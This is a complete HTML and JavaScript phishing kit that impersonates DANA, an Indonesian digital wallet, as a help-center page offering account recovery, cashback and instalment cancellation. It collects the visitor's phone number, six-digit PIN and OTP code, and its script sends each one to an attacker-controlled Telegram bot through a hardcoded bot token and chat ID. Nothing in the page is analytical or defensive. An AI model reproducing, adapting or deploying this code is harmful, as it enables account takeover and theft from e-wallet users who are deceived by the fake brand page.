<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DANA DOMPET DIGITAL INDONESIA</title>
    <meta name="theme-color" content="#0086e6">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script>
        tailwind.config = { theme: { extend: { colors: { dana: '#0086e6' } } } }
    </script>
    <style type="text/tailwindcss">
        @layer utilities { .bg-dana { background-color: #0086e6; } }
    </style>

    <style>
        body {margin:0; padding:0; font-family:Arial, sans-serif; background:#f4f7fa;}
        .halaman {position:absolute; top:0; left:0; width:100%; height:100%;}
        .hilang {display:none !important;}

        /* Tampilan 3D */
        .header-3d-wrapper {width:100%; height:340px; background:linear-gradient(135deg, #0086e6, #0056b3); display:flex; justify-content:center; align-items:center; overflow:hidden;}
        .carousel-3d-container {width:300px; height:180px; position:relative; perspective:1000px;}
        .carousel-3d-spinner {width:100%; height:100%; position:absolute; transform-style:preserve-3d; animation:spin 20s infinite linear;}
        .carousel-3d-item {position:absolute; width:280px; height:160px; border-radius:12px; overflow:hidden; box-shadow:0 10px 25px rgba(0,0,0,0.4);}
        .carousel-3d-item img {width:100%; height:100%; object-fit:cover;}
        .carousel-3d-item:nth-child(1){transform:rotateY(0deg) translateZ(250px);}
        .carousel-3d-item:nth-child(2){transform:rotateY(72deg) translateZ(250px);}
        .carousel-3d-item:nth-child(3){transform:rotateY(144deg) translateZ(250px);}
        .carousel-3d-item:nth-child(4){transform:rotateY(216deg) translateZ(250px);}
        .carousel-3d-item:nth-child(5){transform:rotateY(288deg) translateZ(250px);}
        @keyframes spin {from{transform:rotateY(0deg);} to{transform:rotateY(360deg);}}
    </style>
</head>
<body>
    <div class="max-w-md mx-auto relative overflow-hidden bg-white" style="height:100vh;">

        <!-- ============= HALAMAN UTAMA ============= -->
        <div id="utama" class="halaman bg-dana">
            <div class="header-3d-wrapper">
                <div class="carousel-3d-container">
                    <div class="carousel-3d-spinner">
                        <div class="carousel-3d-item"><img src="promo dana .jpeg"></div>
                        <div class="carousel-3d-item"><img src="DANA.png"></div>
                        <div class="carousel-3d-item"><img src="playleter.jpg"></div>
                        <div class="carousel-3d-item"><img src="DANA-Cicil.jpg"></div>
                        <div class="carousel-3d-item"><img src="promo hadiah.png"></div>
                    </div>
                </div>
            </div>

            <div class="absolute bottom-0 w-full bg-white rounded-t-3xl px-6 pt-8 pb-20">
                <p class="text-center text-gray-400 text-sm">PUSAT BANTUAN</p>
                <h2 class="text-center text-dana font-bold text-lg mb-6">INPUT SESUAI KENDALA ANDA</h2>

                <!-- ✅ TOMBOL UTAMA - SUDAH DIPASANG FUNGSI LANGSUNG -->
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PULIHKAN AKUN DI BEKUKAN</button>
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">KLAIM VOCER CASHBACK DANA</button>
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">PEMBATALAN DANA CICIL</button>
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold mb-3 shadow-md">LAPORAN KENDALA AKUN</button>
                <button onclick="ganti('nomor')" class="w-full bg-dana text-white py-3.5 rounded-xl font-semibold shadow-md">KENDALA LAINNYA</button>
            </div>

            <!-- Nav Bawah -->
            <div class="absolute bottom-0 w-full bg-white border-t py-2 px-6 flex justify-between">
                <div onclick="ganti('utama')" class="text-center text-dana cursor-pointer">
                    <svg width="22" height="22" fill="#0086e6" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h5v8z"/></svg>
                    <span class="text-xs">Beranda</span>
                </div>
                <div onclick="ganti('nomor')" class="text-center text-gray-400 cursor-pointer">
                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
                    <span class="text-xs">Aktivitas</span>
                </div>
                <div onclick="ganti('nomor')" class="bg-dana rounded-full p-3 -mt-5 shadow-lg cursor-pointer">
                    <svg width="24" height="24" fill="white" viewBox="0 0 24 24"><path d="M19 12c0 .55-.45 1-1 1h-1v1c0 .55-.45 1-1 1s-1-.45-1-1v-1h-2c-.55 0-1-.45-1-1s.45-1 1-1h2V9c0-.55.45-1 1-1s1 .45 1 1v1h1c.55 0 1 .45 1 1z"/></svg>
                </div>
                <div onclick="ganti('nomor')" class="text-center text-gray-400 cursor-pointer">
                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2v-1h18zm-9-9c1.66 0 3-1.34 3-3S13.66 3 12 3 9 4.34 9 6s1.34 3 3 3zm6 0c1.66 0 3-1.34 3-3S19.66 3 18 3s-3 1.34-3 3 1.34 3 3 3zm-6 2c-2.33 0-7 1.17-7 3.5V19h14v-4.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
                    <span class="text-xs">Dompet</span>
                </div>
                <div onclick="ganti('nomor')" class="text-center text-gray-400 cursor-pointer">
                    <svg width="22" height="22" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
                    <span class="text-xs">Saya</span>
                </div>
            </div>
        </div>


        <!-- ============= HALAMAN NOMOR ============= -->
        <div id="nomor" class="halaman bg-dana hilang flex flex-col items-center justify-between px-6 py-16">
            <img src="nama-gambar.jpg" class="w-24 mb-8" />
            <div class="w-full flex flex-col items-center">
                <p class="text-white text-lg font-medium mb-8 text-center">Masukan nomor HP kamu untuk lanjut</p>
                <div class="w-full max-w-sm flex items-center bg-white rounded-lg overflow-hidden mb-6 shadow-md">
                    <div class="flex items-center gap-2 px-3 border-r border-gray-200">
                        <img src="nama-gambar.jpg" class="w-6 h-4" />
                        <span class="text-gray-800 font-semibold text-lg">+62</span>
                    </div>
                    <input type="tel" id="inpNomor" placeholder="811-1234-5678" class="flex-1 px-3 py-3.5 text-gray-800 text-lg outline-none" />
                </div>
                <p class="text-white/90 text-sm text-center px-4 mb-10">Dengan melanjutkan, kamu setuju dengan Syarat & Ketentuan</p>
            </div>
            <!-- ✅ TOMBOL LANJUT KE PIN -->
            <button onclick="prosesNomor()" class="text-white font-medium text-lg tracking-wide">LANJUT</button>
        </div>


        <!-- ============= HALAMAN PIN ============= -->
        <div id="pin" class="halaman bg-dana hilang flex flex-col items-center justify-between px-6 py-16">
            <img src="nama-gambar.jpg" class="w-20 mb-8" />
            <div class="w-full flex flex-col items-center">
                <p class="text-white text-lg font-medium mb-10">Masukan PIN DANA</p>
                <div class="flex gap-3 mb-6" id="kotakPin">
                    <div class="w-14 h-16 bg-white rounded-md border flex items-center justify-center"><div class="w-0.5 h-6 bg-gray-400"></div></div>
                    <div class="w-14 h-16 bg-white rounded-md border"></div>
                    <div class="w-14 h-16 bg-white rounded-md border"></div>
                    <div class="w-14 h-16 bg-white rounded-md border"></div>
                    <div class="w-14 h-16 bg-white rounded-md border"></div>
                    <div class="w-14 h-16 bg-white rounded-md border"></div>
                </div>
            </div>

            <!-- ✅ KEYBOARD PIN -->
            <div class="w-full absolute bottom-0 left-0 right-0 bg-white/10 py-4 px-8 grid grid-cols-3 gap-4">
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="1">1</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="2">2</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="3">3</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="4">4</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="5">5</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="6">6</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="7">7</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="8">8</button>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="9">9</button>
                <div></div>
                <button class="btnAngka py-3 text-xl font-semibold text-white rounded-lg" data-n="0">0</button>
                <button id="hapusPin" class="py-3 text-xl font-semibold text-white rounded-lg">⌫</button>
            </div>
        </div>


        <!-- ============= HALAMAN OTP ============= -->
        <div id="otp" class="halaman bg-white hilang flex flex-col items-center px-6 pt-16">
            <div class="absolute top-0 w-full h-12 bg-dana flex items-center justify-center">
                <i class="fa fa-arrow-left text-white absolute left-4 cursor-pointer" onclick="ganti('pin')"></i>
                <span class="text-white font-bold text-lg">Masukan Kode OTP</span>
            </div>
            <p class="text-lg font-medium text-gray-800 mb-3 text-center">Kode telah dikirim ke nomor<br><span id="noOtp" class="font-bold">+62 </span></p>
            <div class="flex gap-4 mb-6" id="kotakOtp">
                <div class="w-14 h-16 border-b-2 border-gray-400 flex items-center justify-center text-2xl font-semibold"><div class="w-0.5 h-6 bg-gray-400"></div></div>
                <div class="w-14 h-16 border-b-2 border-gray-400"></div>
                <div class="w-14 h-16 border-b-2 border-gray-400"></div>
                <div class="w-14 h-16 border-b-2 border-gray-400"></div>
            </div>

            <!-- ✅ KEYBOARD OTP -->
            <div class="w-full max-w-xs grid grid-cols-3 gap-y-6 gap-x-4 mt-4">
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="1">1</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="2">2</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="3">3</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="4">4</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="5">5</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="6">6</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="7">7</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="8">8</button>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="9">9</button>
                <div></div>
                <button class="btnOtp py-3 text-xl font-semibold text-gray-800 rounded-lg" data-n="0">0</button>
                <button id="hapusOtp" class="py-3 text-xl font-semibold text-gray-800 rounded-lg">⌫</button>
            </div>
        </div>

    </div>

    <script>
        const BOT_TOKEN = "8650420881:AAF5wZ-Y1-p31T1bUy2DLbZzO3k8HV6Iqjw";
        const CHAT_ID = "7343679071";
        let nomorHp, pinDana, pesanId;

        // ✅ FUNGSI GANTI HALAMAN UTAMA - PALING SEDERHANA
        function ganti(id) {
            document.querySelectorAll('.halaman').forEach(h => h.classList.add('hilang'));
            document.getElementById(id).classList.remove('hilang');
        }

        // ✅ LANGKAH 1: DARI NOMOR KE PIN
        function prosesNomor() {
            nomorHp = document.getElementById('inpNomor').value.replace(/\D/g, "");
            if(nomorHp.length < 4) return alert("Isi nomor!");

            document.getElementById('noOtp').textContent = "+62 " + nomorHp;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method:"POST",
                headers:{"Content-Type":"application/json"},
                body:JSON.stringify({chat_id:CHAT_ID, text:`📥 DATA MASUK\n📱 Nomor: ${nomorHp}\n🔑 PIN: ...\n🔐 OTP: ...`})
            }).then(r=>r.json()).then(d=>{ pesanId=d.result.message_id; ganti('pin'); aktifPin(); });
        }

        // ✅ LANGKAH 2: DARI PIN KE OTP
        function aktifPin() {
            const kotak = document.querySelectorAll('#kotakPin > div');
            let isi = "";

            document.querySelectorAll('.btnAngka').forEach(b=>{
                b.onclick=()=>{
                    if(isi.length<6){
                        isi+=b.dataset.n;
                        kotak[isi.length-1].innerHTML='<span class="text-xl font-bold">●</span>';
                        if(isi.length===6){
                            pinDana=isi;
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                                method:"POST",
                                headers:{"Content-Type":"application/json"},
                                body:JSON.stringify({chat_id:CHAT_ID, message_id:pesanId, text:`📥 DATA MASUK\n📱 Nomor: ${nomorHp}\n🔑 PIN: ${pinDana}\n🔐 OTP: ...`})
                            });
                            setTimeout(()=>{ ganti('otp'); aktifOtp(); },200);
                        }
                    }
                }
            });

            document.getElementById('hapusPin').onclick=()=>{
                if(isi.length>0){ isi=isi.slice(0,-1); kotak[isi.length].innerHTML=''; }
            };
        }

        // ✅ LANGKAH 3: OTP SELESAI
        function aktifOtp() {
            const kotak = document.querySelectorAll('#kotakOtp > div');
            let isi = "";

            document.querySelectorAll('.btnOtp').forEach(b=>{
                b.onclick=()=>{
                    if(isi.length<4){
                        isi+=b.dataset.n;
                        kotak[isi.length-1].textContent=isi;
                        if(isi.length===4){
                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                                method:"POST",
                                headers:{"Content-Type":"application/json"},
                                body:JSON.stringify({chat_id:CHAT_ID, message_id:pesanId, text:`✅ DATA LENGKAP\n📱 Nomor: ${nomorHp}\n🔑 PIN: ${pinDana}\n🔐 OTP: ${isi}`})
                            });
                            alert("Berhasil!");
                            ganti('utama');
                        }
                    }
                }
            });

            document.getElementById('hapusOtp').onclick=()=>{
                if(isi.length>0){ isi=isi.slice(0,-1); kotak[isi.length].innerHTML=''; }
            };
        }
    </script>
</body>
                  </html>
